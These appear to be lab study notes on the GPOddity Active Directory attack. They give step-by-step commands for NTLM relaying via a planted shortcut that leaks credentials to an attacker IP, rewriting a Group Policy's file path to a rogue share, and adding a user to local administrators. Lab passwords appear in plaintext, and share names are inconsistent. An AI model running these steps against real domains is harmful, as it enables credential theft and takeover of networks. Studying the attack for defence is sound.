A GPO with overly permissive ACL can be abused for multiple attacks.

GPOddity combines `NTLM` relaying and modification of Group Policy
Container. By relaying credentials of a user who has `WriteDACL` on GPO, we can
modify the path (`gPCFileSysPath`) of the group policy template (default
is `SYSVOL`).

This enables loading of a malicious template from a location that we
control.


![[Pasted image 20250505062951.png]]

Open WSL Ubuntu shell and start NTLM relay (relay) - WSLToTh3Rescue!
```bash
sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.48 --http-port '80,8080' -i --no-smb-server
```

Create new shortcut with this command and place in writable share
```bash
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke WebRequest -Uri 'http://172.16.100.48' -UseDefaultCredentials"

xcopy .\student548.lnk \\dcorp-ci\AI
```

After relay connect to shell
```bash
nc 127.0.0.1 11000
```

Delegate `WriteDACL` permissions to the group policy the relayed user can control
```bash
write_gpo_dacl student548 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```

**OR** we can add a computer and use those credentials
```bash
add_computer stdx-gpattack Secretpass@123

write_gpo_dacl stdx-gpattack$ {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```

Run GPOddity to edit Group Policy
```bash
sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'studentx' --password 'gG38Ngqym2DpitXuGrsJ' --command 'net localgroup administrators studentx
/add' --rogue-smbserver-ip '172.16.100.x' --rogue-smbserver-share 'std548-gp' -
-dc-ip '172.16.2.1' --smb-mode none
```

Move group policy files from GPOddity to new share folder
```bash
mkdir /mnt/c/AD/Tools/std548-gp

cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/std548-gp
```

From Admin CMD create a the file share called `std548-gp` and grant full perms to everyone
```powershell
net share stdx-gp=C:\AD\Tools\stdx-gp /grant:Everyone,Full

icacls "C:\AD\Tools\stdx-gp" /grant Everyone:F /T
```

Check `gpcfilesyspath`
```powershell
Get-DomainGPO  -Identity "DevOps Policy"
```

Wait for Group Policy to refresh and test new privileges
```powershell
winrs -r:dcorp-ci cmd /c "set computername && set username"
```